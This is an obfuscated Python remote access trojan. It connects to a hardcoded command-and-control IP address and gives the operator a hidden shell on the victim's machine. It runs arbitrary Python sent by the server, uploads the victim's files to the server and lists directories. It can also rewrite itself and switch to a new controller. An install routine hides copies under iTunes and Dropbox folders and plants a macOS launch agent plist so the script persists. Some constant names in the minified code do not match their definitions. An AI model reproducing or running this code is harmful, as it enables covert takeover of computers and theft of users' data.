#!/usr/bin/env python
bC=True
bi=None
ba=type
bf=str
bg=bytes
bq=len
bm=Exception
bc=False
bn=list
bw=dict
bu=open
bx=OSError
bs=int
bO=id
import socket
import subprocess
import sys
import os
import platform
import shutil
import time
import json
import threading
import struct
import base64
import traceback
import ssl
import getpass
try:
 from StringIO import StringIO
except:
 from io import StringIO
__version__="1.0"
F='50.159.66.236'
b=1708
R='.host'
E='.id'
H='stdin'
p='eval'
G='cmd'
z='kill'
W='transfer'
M='assign'
l='ls'
D='down'
C='fstream'
i='fclose'
a='fname'
f='cstream'
g='cclose'
q=StringIO()
m=bC
c=sys.stdout
n=sys.stderr
w=bi
class T:
 u=4
 x=2**13
 def __init__(s,O):
  s.sock=O
  s.lastbytes=b''
 def format_send(s,r):
  if ba(r)==bf:
   r=bf.encode(r)
  if ba(r)==bg:
   s.sock.sendall(struct.pack('>i',bq(r))+r)
  else:
   raise bm("msg must be of type bytes or str")
 def format_recv(s):
  v=s.lastbytes
  s.lastbytes=b''
  U=b''
  J=sys.maxsize
  if bq(v)>T.SIZE_BYTES:
   Q=v[:T.SIZE_BYTES]
   J=struct.unpack('>i',Q)[0]
   U+=v[T.SIZE_BYTES:]
  while bq(U)<J:
   V=s.sock.recv(T.RECV_SIZE)
   if not V:
    raise bm("Connection Severed")
   v+=V
   if J==sys.maxsize and bq(v)>T.SIZE_BYTES:
    Q=v[:T.SIZE_BYTES]
    J=struct.unpack('>i',Q)[0]
    U+=v[T.SIZE_BYTES:]
   else:
    U+=V
  s.lastbytes=U[J:]
  return U[:J]
 def close(s):
  s.sock.close()
class k:
 Y=2**14
 def __init__(s,datinit=bg):
  s.dat=j()
  s.lock=threading.Lock()
  s.condition=threading.Condition(s.lock)
 def append(s,X):
  with s.lock:
   if ba(s.dat)!=ba(X):
    if ba(s.dat)==bg and ba(X)==bf:
     X=X.encode('UTF-8','ignore')
    elif ba(s.dat)==bf and ba(X)==bg:
     X=X.decode('UTF-8','ignore')
   while bq(s.dat)>=k.FILLTO:
    s.condition.wait()
   s.dat+=X
 def getdat(s,t):
  with s.lock:
   if t>0:
    y=s.dat[:t]
    s.dat=s.dat[t:]
    s.condition.notify()
    return y
   return s.dat[:0]
 def empty(s):
  with s.lock:
   return bq(s.dat)==0
class ByteLockBundler:
 S=2**13
 def __init__(s,L):
  s.stdoutbytes=k(bg)
  s.stderrbytes=k(bg)
  s.printstrs=k(bf)
  s.errstrs=k(bf)
  s.specialbytes={}
  s.filebytes={}
  s.fileclose=[]
  s.fsock=L
  s.flock=threading.Lock()
  s.slock=threading.Lock()
 def writeStdout(s,wbytes):
  s.stdoutbytes.append(wbytes)
 def writeStderr(s,wbytes):
  s.stderrbytes.append(wbytes)
 def writePrintstr(s,wstr):
  s.printstrs.append(wstr)
 def writeErrstr(s,wstr):
  s.errstrs.append(wstr)
 def writeFileup(s,e,wbytes):
  with s.flock:
   if e not in s.filebytes:
    s.filebytes[e]=k()
   bl=s.filebytes[e]
  bl.append(wbytes)
 def writeSpecial(s,I,wbytes):
  with s.slock:
   s.specialbytes[I]=wbytes.decode('UTF-8')
 def closeFile(s,e):
  with s.flock:
   if e not in s.fileclose:
    s.fileclose.append(e)
 def getAndClear(s,bytesize=4096):
  P=bc
  o={}
  with s.slock:
   for K in s.specialbytes.keys():
    if bq(o)==0 or bq(s.specialbytes[K])<=bytesize:
     o[K]=s.specialbytes[K]
     bytesize-=bq(o[K])
   for K in o.keys():
    s.specialbytes.pop(K)
   if bq(s.specialbytes)>0:
    P=bC
  h=s.printstrs.getdat(bytesize)
  bytesize-=bq(h)
  N=s.errstrs.getdat(bytesize)
  bytesize-=bq(N)
  d=s.stdoutbytes.getdat(bytesize)
  bytesize-=bq(d)
  A=s.stderrbytes.getdat(bytesize)
  bytesize-=bq(A)
  with s.flock:
   Fb={}
   FR=[]
   FE=bn(s.filebytes.keys())
   for e in FE:
    FH=s.filebytes[e].getdat(bytesize)
    bytesize-=bq(FH)
    if s.filebytes[e].empty()and e in s.fileclose:
     s.fileclose.remove(e)
     s.filebytes.pop(e)
     FR.append(e)
    Fp=base64.b64encode(FH)
    Fb[e]=Fp
  d=d.decode('UTF-8')
  A=A.decode('UTF-8')
  for e in Fb.keys():
   Fb[e]=Fb[e].decode('UTF-8')
  FG=(bytesize<=0)or P
  Fz=(bytesize<ByteLockBundler.PACKET_MAX_DAT)
  FW=bw(printout=h,errout=N,stdout=d,stderr=A,filestreams=Fb,fileclose=FR,special=o)
  return FG,Fz,FW
 def writeBundle(s):
  FG,Fz,FW=s.getAndClear()
  if Fz:
   FM=json.dumps(FW)
   s.fsock.format_send(FM)
  return FG
class PayloadLib:
 def __init__(s,Fl):
  s.bytelock=Fl
 def upload(s,e,blocking=bc):
  e=os.path.abspath(os.path.expanduser(e))
  if os.path.exists(e):
   FD=os.stat(e).st_size
   FC=json.dumps(bw(filename=e,filesize=FD))
   s.bytelock.writeSpecial('filesize',FC.encode('UTF-8'))
   def downloadfunc():
    with bu(e,'rb')as f:
     X=f.read(ByteLockBundler.PACKET_MAX_DAT)
     while bq(X)>0:
      s.bytelock.writeFileup(e,X)
      X=f.read(ByteLockBundler.PACKET_MAX_DAT)
     s.bytelock.closeFile(e)
   if blocking:
    downloadfunc()
   else:
    t=threading.Thread(target=downloadfunc)
    t.start()
   return bC
  return bc
class Fc:
 def __init__(s,Fi):
  s.func=Fi
 def write(s,wstr):
  s.func(wstr)
def main(host=F,port=b,botid=bi):
 while m:
  if hasInternetConnection():
   try:
    Fa,Ff=getInfo()
    Fg=bw(user=Fa,arch=Ff,version=__version__,bid=botid)
    FM=json.dumps(Fg)
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((host,port))
    Fq=s.recv(1)
    if Fq!=b'\x00':
     s=ssl.wrap_socket(s)
    fs=T(s)
    fs.format_send(FM)
    serve(fs)
   except bm as e:
    sys.stderr.write("[!] "+bf(e))
  if m:
   time.sleep(60)
def serve(O):
 global w
 Fl=ByteLockBundler(O)
 Fm=PayloadLib(Fl)
 sys.stdout=Fc(lambda s:Fl.writePrintstr(s))
 sys.stderr=Fc(lambda s:Fl.writeErrstr(s))
 Fn="bash"
 if os.name=='nt':
  Fn="powershell.exe"
 w=subprocess.Popen([Fn],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,cwd=os.path.expanduser("~"))
 Fw=threading.Lock()
 def pollProcStdout():
  while m:
   with Fw:
    Fu=w.stdout
   d=Fu.read(1)
   with Fw:
    if d=='' and w.poll()is not bi:
     break
   if d!='':
    Fl.writeStdout(d)
 def pollProcStderr():
  while m:
   with Fw:
    Fu=w.stderr
   d=Fu.read(1)
   with Fw:
    if d=='' and w.poll()is not bi:
     break
   if d!='':
    Fl.writeStderr(d)
 def pollSock():
  global m
  global w
  Fx={}
  Fs=bi
  while m:
   FO=O.format_recv()
   Fr=json.loads(FO.decode('UTF-8'))
   if l in Fr:
    Fv={}
    FU=os.path.abspath(os.path.expanduser(Fr[l]))
    if os.path.isdir(FU):
     try:
      ls=os.listdir(FU)
      for FJ in(os.path.join(FU,f)for f in ls):
       try:
        FQ=os.stat(FJ)
        FT=(os.path.isdir(FJ),FQ.st_mode,FQ.st_size)
        Fv[FJ]=FT
       except bx:
        pass
     except:
      pass
    FV=json.dumps((FU,Fv)).encode('UTF-8')
    Fl.writeSpecial("ls",FV)
   if z in Fr:
    with Fw:
     w.kill()
     w=subprocess.Popen([Fn],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,cwd=os.path.expanduser("~"))
   if W in Fr:
    FY=Fr[W][0]
    Fj=bs(Fr[W][1])
    with bu(R,"w")as FJ:
     FJ.write(FY+"\n")
     FJ.write(bf(Fj))
    m=bc
   if M in Fr:
    bO=Fr[M]
    with bu(E,"w")as FX:
     FX.write(bO)
   if H in Fr:
    with Fw:
     w.stdin.write(Fr[H].encode('UTF-8'))
     w.stdin.flush()
   if G in Fr:
    Fk=Fr[G]
    Fy=Fk.split(" ")
    Ft=subprocess.Popen(Fy)
   if p in Fr:
    def execfunc():
     try:
      exec(Fr[p])in{'payloadlib':Fm}
     except bm as e:
      tb=traceback.format_exc()
      sys.stderr.write(tb)
    t=threading.Thread(target=execfunc)
    t.start()
   if a in Fr:
    e=Fr[a]
    if e not in Fx:
     Fx[e]=bu(e,'wb')
    FS=Fx[e]
    FL=Fr[C]
    Fe=base64.b64decode(FL)
    FS.write(Fe)
   if i in Fr:
    e=Fr[i]
    if e in Fx:
     Fx[e].close()
     Fx.pop(e)
   if f in Fr:
    if Fs is bi:
     Fs=bu(os.path.abspath(__file__),"wb")
    FL=Fr[f]
    Fs.write(FL.encode('UTF-8'))
   if g in Fr and Fs is not bi:
    Fs.close()
    m=bc
   if D in Fr:
    e=Fr[D]
    Fm.upload(e)
   if not m:
    with Fw:
     w.kill()
    Fl.fsock.close()
 def writeBundles():
  FI=bC
  while m:
   if not FI:
    time.sleep(0.1)
   FI=Fl.writeBundle()
 FP=threading.Thread(target=pollSock)
 Fo=threading.Thread(target=pollProcStdout)
 FK=threading.Thread(target=pollProcStderr)
 FB=threading.Thread(target=writeBundles)
 FP.start()
 Fo.start()
 FK.start()
 FB.start()
 FP.join()
def getInfo():
 Fa=getpass.getuser()
 if platform.system()=='Darwin':
  Ff='OSX '+platform.mac_ver()[0]+' '+platform.mac_ver()[2]
 else:
  Ff=platform.system()+" "+platform.release()
 return Fa,Ff
def hasInternetConnection():
 try:
  socket.getaddrinfo("google.com",80)
  return bC
 except:
  return bc
Fh=('<?xml version="1.0" encoding="UTF-8"?>'+'\n' '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" ' '"http://www.apple.com/DTDs/PropertyList-1.0.dtd">'+'\n' '<plist version="1.0">'+'\n' '<dict>'+'\n' '\t'+'<key>Label</key>'+'\n' '\t'+'<string>pythondaemon</string>'+'\n' '\t'+'<key>ProgramArguments</key>'+'\n' '\t'+'<array>'+'\n' '\t\t'+'<string>{python_path}</string>'+'\n' '\t\t'+'<string>{script_path}</string>'+'\n' '\t'+'</array>'+'\n' '\t'+'<key>StandardErrorPath</key>'+'\n' '\t'+'<string>/var/log/python_script.error</string>'+'\n' '\t'+'<key>KeepAlive</key>'+'\n' '\t'+'<true/>'+'\n' '</dict>'+'\n' '</plist>'+'\n')
FN=['/System/Library/LaunchAgents','/System/Library/LaunchDaemons','~/Library/LaunchAgents']
Fd='library_launcher.plist'
FA=['~/Music/iTunes/.library.py','~/.dropbox/.index.py']
bF='-install'
def install_osx(host,port):
 w=subprocess.Popen(["which","python"],stdout=subprocess.PIPE)
 (d,A)=w.communicate()
 if A is not bi:
  return bc
 bR=d.strip()
 bE=bi
 for bH in FA:
  bE=os.path.expanduser(bH)
  if not os.path.exists(bE):
   try:
    shutil.copy(os.path.abspath(__file__),bE)
    break
   except:
    pass
 if bE is bi:
  return bc
 bp=os.path.dirname(bE)
 with bu(os.path.join(bp,R),"w")as f:
  f.write(host+"\n")
  f.write(bf(port))
 bG=bi
 for bH in FN:
  bG=os.path.join(os.path.expanduser(bH),Fd)
  if not os.path.exists(bG):
   try:
    with bu(bG,"w")as f:
     f.write(Fh.format(python_path=bR,script_path=bE))
    break
   except:
    pass
 if bG is not bi:
  return bC
if __name__=="__main__":
 if bF in sys.argv:
  FY=F
  Fj=b
  bz=sys.argv.index(bF)
  if bq(sys.argv)>bz+2:
   FY=sys.argv[bz+1]
   Fj=sys.argv[bz+2]
  install_osx(FY,Fj)
 else:
  FY=F
  Fj=b
  bW=bi
  if os.path.exists(R):
   with bu(R,"r")as f:
    bM=[s.strip()for s in f.readlines()]
   try:
    bl=bM[0]
    bD=bs(bM[1])
    FY=bl
    Fj=bD
   except:
    pass
  if os.path.exists(E):
   with bu(E,"r")as f:
    bW=f.read()
  main(FY,Fj,bW)
  if not m:
   os.execv(sys.executable,[sys.executable]+sys.argv)
# Created by pyminifier (https://github.com/liftoff/pyminifier)

